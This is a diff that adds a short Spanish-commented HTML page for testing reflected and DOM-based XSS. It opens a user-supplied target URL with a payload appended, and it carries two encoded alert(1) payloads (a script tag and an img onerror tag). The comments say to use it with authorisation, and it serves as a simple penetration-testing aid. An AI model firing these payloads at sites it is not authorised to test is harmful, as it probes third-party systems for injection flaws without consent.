@@ -1,0 +1,31 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>XSS Test (plantilla)</title>
+  </head>
+  <body>
+    <!--
+      INSTRUCCIONES:
+      - Usar con autorización.
+      - Rellenar el campo targetUrl con la URL donde se pasa un parámetro 'q' o similar.
+      - Usa payloads simples como: %3Cscript%3Ealert(1)%3C%2Fscript%3E o %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+    -->
+    <label>Target URL (ej: https://target/search?q=): <input id="u" size="60" /></label>
+    <br/>
+    <label>Payload: <input id="p" value="%3Cscript%3Ealert(1)%3C%2Fscript%3E" size="60"/></label>
+    <br/>
+    <button id="go">Abrir con payload</button>
+    <script>
+      document.getElementById('go').addEventListener('click', function(){
+        var u = document.getElementById('u').value;
+        var p = document.getElementById('p').value;
+        if(!u) return alert('Rellena la URL objetivo');
+        // construye y abre la URL en nueva pestaña
+        var url = u + encodeURIComponent(decodeURIComponent(p));
+        window.open(url, '_blank');
+      });
+    </script>
+    <p>Esto te ayuda a lanzar payloads simples para probar XSS reflejado/DOM desde el navegador.</p>
+  </body>
+</html>
